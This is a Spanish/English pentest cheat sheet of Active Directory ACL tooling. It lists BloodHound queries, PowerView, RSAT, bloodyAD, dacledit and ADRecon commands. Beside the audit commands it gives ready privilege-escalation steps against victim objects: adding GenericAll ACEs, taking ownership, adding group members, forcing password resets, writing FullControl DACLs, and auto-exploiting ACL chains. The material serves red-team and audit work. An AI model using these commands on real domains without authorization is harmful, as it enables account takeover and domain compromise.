---
aliases:
  - ACL Tooling
  - BloodHound ACL
  - PowerView ACL
  - bloodyAD
tags:
  - type/tool
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - ACL Enumeration]]"
  - "[[BloodHound & SharpHound]]"
---
# AD - ACL Enumeration - Tooling

***

## BloodHound / SharpHound

| **Comando / Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SharpHound.exe -c ACL,Container,Group,ObjectProps` | Targeted ACL collection | Stealth. |
| `SharpHound.exe -c All` | Comprehensive incluye ACLs | Standard. |
| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip` | Linux collection | Linux. |
| `MATCH (u {owned:true})-[:GenericAll\|GenericWrite\|WriteDacl\|WriteOwner\|ForceChangePassword\|AddMember\|AllExtendedRights*1..]->(t {highvalue:true}) RETURN p` | Owned → high-value paths | Privesc. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p` | Shortest path a DA | Standard. |
| `MATCH (u)-[r:GetChanges\|GetChangesAll]->(d:Domain) RETURN u,d` | DCSync rights | Critical. |
^ad-acl-tool-bh

___

## PowerView (Adversary)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-DomainObjectAcl -SamAccountName <name> -ResolveGUIDs` | DACL per-object | Standard. |
| `Get-DomainObjectAcl -Identity <DN> -ResolveGUIDs` | Por DN | Targeted. |
| `Find-InterestingDomainAcl -ResolveGUIDs` | Bulk hunt forest-wide | Standard. |
| `Add-DomainObjectAcl -TargetIdentity <victim> -PrincipalIdentity <atacante> -Rights All` | Add ACE (priv) | Privesc step. |
| `Remove-DomainObjectAcl -TargetIdentity <victim> -PrincipalIdentity <atacante>` | Cleanup | Post-engagement. |
| `Set-DomainObjectOwner -TargetIdentity <victim> -PrincipalIdentity <atacante>` | Take ownership (priv) | WriteOwner abuse. |
^ad-acl-tool-powerview

___

## RSAT / PowerShell

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:<DN>"` | DACL native | Standard. |
| `(Get-Acl "AD:<DN>").Access \| ? IdentityReference -match "<principal>"` | Filter por principal | Targeted. |
| `Set-Acl "AD:<DN>" -AclObject $acl` | Modify (priv) | Privesc step. |
| `Get-ADObject <DN> -Pr nTSecurityDescriptor` | Raw SD object | Detail. |
| `Get-ADObject -Filter * -Pr nTSecurityDescriptor` | Bulk objects con SD | Custom audit. |
^ad-acl-tool-rsat

___

## bloodyAD (Linux)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `bloodyAD --host <DC> -d corp -u u -p pass get object "<DN>" --resolve-sd` | DACL human-readable | Linux audit. |
| `bloodyAD --host <DC> -d corp -u u -p pass add genericAll <victim> <atacante>` | Add GenericAll ACE | Privesc. |
| `bloodyAD --host <DC> -d corp -u u -p pass remove genericAll <victim> <atacante>` | Remove ACE | Cleanup. |
| `bloodyAD --host <DC> -d corp -u u -p pass set owner <victim> <atacante>` | Take ownership | WriteOwner abuse. |
| `bloodyAD --host <DC> -d corp -u u -p pass add groupMember <group> <atacante>` | AddMember/AddSelf abuse | Group ACE. |
| `bloodyAD --host <DC> -d corp -u u -p pass set password <victim> '<NewPass!>'` | ForceChangePassword | Direct abuse. |
^ad-acl-tool-bloodyad

```bash
# Pipeline ACL audit Linux
bloodyAD --host <DC> -d corp -u auditor -p 'Pass!' \
  get search "(objectClass=*)" --resolve-sd \
  --base "CN=Domain Admins,CN=Users,DC=corp,DC=local"
```

___

## ldapsearch / Linux

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "<DN>" -s base "(objectClass=*)" nTSecurityDescriptor` | Raw SD binary | LDAP-only. |
| `dacledit.py corp.local/u:p -dc-ip <DC> -principal <atacante> -target <victim> -action read` | DACL Linux (krbrelayx) | Edge. |
| `dacledit.py ... -rights FullControl -action write` | Write DACL Linux | Privesc. |
| `net rpc rights list -U 'corp/u%pass' -S <DC>` | RPC rights list | Adjacent. |
^ad-acl-tool-ldapsearch

___

## ADRecon / Bulk Reports

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `.\ADRecon.ps1 -DomainController <DC> -OutputType Excel` | Excel multi-sheet (incluye ACLs) | Auditor-friendly. |
| `.\ADRecon.ps1 ... -Collect ACLs` | Solo ACL sheet | Targeted. |
| Inspect `ADRecon-Report\CSV-Files\ACLs.csv` | Bulk CSV | Post-process. |
| `ldapdomaindump 'corp\u:p'@<DC>` | HTML/JSON con ACL | Linux equivalent. |
^ad-acl-tool-adrecon

___

## Custom Audit Tools

| **Tool** | **Use** | **Cuándo** |
|:---:|:---:|:---:|
| `Invoke-Aclpwn` | Auto-exploit ACL chains | Privesc. |
| `acled.py` | ACE add/remove desde Linux | Adjacent. |
| `dacledit.py` (krbrelayx) | DACL modify Linux | Linux exploit. |
| `aclpwn.py` (Linux) | Auto privesc via ACL | Linux automation. |
| `Invoke-DomainPasswordSpray` cross-correlate con ACL paths | Spray + privesc combo | Combined. |
| `PingCastle.exe --healthcheck` | Includes ACL findings | Quarterly. |
| Purple Knight | IoE ACL | Cross-tool. |
^ad-acl-tool-custom

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| BloodHound docs (ACL edges) | `https://bloodhound.specterops.io/resources/edges/acl-edges` |
| PowerView docs | `https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon` |
| bloodyAD | `https://github.com/CravateRouge/bloodyAD` |
| krbrelayx (dacledit) | `https://github.com/dirkjanm/krbrelayx` |
| HackTricks ACL Privesc | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse` |
| The Hacker Recipes — ACE/ACL | `https://www.thehacker.recipes/ad/movement/dacl` |
| Will Schroeder — ACE Abuse | `https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-3eca9a02fc2a` |
| ADSecurity ACL articles | `https://adsecurity.org` |
| `awesome-active-directory` | `https://github.com/Orange-Cyberdefense/awesome-activedirectory` |
^ad-acl-tool-resources

***
